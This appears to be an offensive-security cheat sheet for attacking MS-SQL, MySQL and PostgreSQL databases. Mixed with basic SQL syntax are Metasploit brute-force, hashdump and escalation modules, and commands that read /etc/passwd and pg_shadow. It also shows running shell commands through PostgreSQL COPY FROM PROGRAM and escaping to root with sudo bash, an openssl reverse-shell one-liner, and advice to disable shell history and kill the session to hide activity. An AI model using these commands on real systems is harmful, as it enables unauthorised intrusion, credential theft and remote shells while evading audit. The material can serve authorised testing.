Databases

 
# MS-SQL

Locate
msf > use auxiliary/scanner/mssql/mssql_ping
nmap -sU -Pn -n -T4 --open -p1434 <targetRange>

nmap -p1433 --script ms-sql-info <targetIP>
nmap -p1433 --script ms-sql-brute --script-args mssql.instance-all,userdb=userlist.txt,passdb=wordlist.txt <targetIP>

msf > use auxiliary/scanner/mssql/mssql_login
msf > use auxiliary/admin/mssql/mssql_enum
msf > use auxiliary/scanner/mssql/mssql_hashdump
msf > use auxiliary/admin/mssql/mssql_escalate_dbowner

Post exploitation
msf > use auxiliary/admin/mssql/mssql_exec
------------------------------------------------------------------------------------------------------

# MySQL

mysql -h <IP> -u <username> -p          # Login remotely
mysql -u root                           # Login locally as root

CREATE USER 'newuser'@'localhost' IDENTIFIED BY 'password';
CREATE DATABASE <database>;
GRANT ALL PRIVILEGES ON <database>.* TO 'newuser'@'localhost';
FLUSH PRIVILEGES;

SHOW DATABASES;
USE <database>;
SHOW TABLES;
SHOW FIELDS FROM <table>;

DELETE FROM <table> WHERE <field>="value";

DROP DATABASE <database>;
DROP TABLE 'table1', 'table2', 'table3';
ALTER TABLE <table> DROP COLUMN <field>;

SELECT * FROM <table>;
SELECT * FROM <table> WHERE <field>="value";
SELECT LOAD_FILE('/etc/passwd')\g;

SET PASSWORD FOR username@localhost = PASSWORD('newpassword');

UPDATE <table> SET <field>="value";

INSERT INTO <table> VALUES('John', 'Smith', 'john.smith@acme.com');

DISTINCT <field>
GROUP BY <field>
LIMIT <number>
OFFSET <number>
ORDER BY <field>
WHERE <field> IS NOT NULL
WHERE <field> LIKE

\! whoami
\! sudo whoami
\! sudo bash

Examples:
SELECT * FROM hostvulns WHERE vulnerability LIKE "%Default%" ORDER BY vulnerability;
SELECT * FROM hosts WHERE host LIKE '%|%%' escape '|'
SELECT LENGTH(vulnerability), COUNT(*) FROM hostvulns GROUP BY LENGTH(vulnerability);
SELECT DISTINCT last_name,first_name FROM contacts WHERE first_name IS NOT NULL ORDER BY last_name;
SELECT DISTINCT email FROM contacts WHERE email LIKE "%@target.com" ORDER BY email
DELETE from profiles WHERE rowid='53';
UPDATE hostvulns SET tool="Nessus";
------------------------------------------------------------------------------------------------------

# Postgresql

psql -U <username> -h <IP> -d <database>
select username, passwd from pg_shadow;
select current_database();
create table test (input TEXT); copy test from '/etc/passwd'; select input from test;

psql -U postgres -h <IP>                     # Login with user 'postgres' and no password.
\l                                           # List databases.
\du                                          # List database users.
select pg_ls_dir('/etc');                    # List directory contents of /etc.
\c postgres                                  # Connect to the 'postgres' db.
\d                                           # List of tables.

create table tmp(data text);                 # Create a table called 'tmp'.
copy tmp(data) from program 'ls -l /home';   # Run a command in the shell and save the output.
select * from tmp;                           # Print the contents of the table.

copy tmp from '/etc/passwd';
select * from tmp;

delete from tmp;                             # Clear the table.

Replace 'ls -l /home' with whatever command you'd like to run.
drop table tmp;

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
openssl s_client -quiet -connect <IP>:<port> | /bin/sh 2>&1 | openssl s_client -connect <IP>:<port>

Make sure to `export HISTFILE=/dev/null` when you get on, and `kill -9 $$` when you get off.

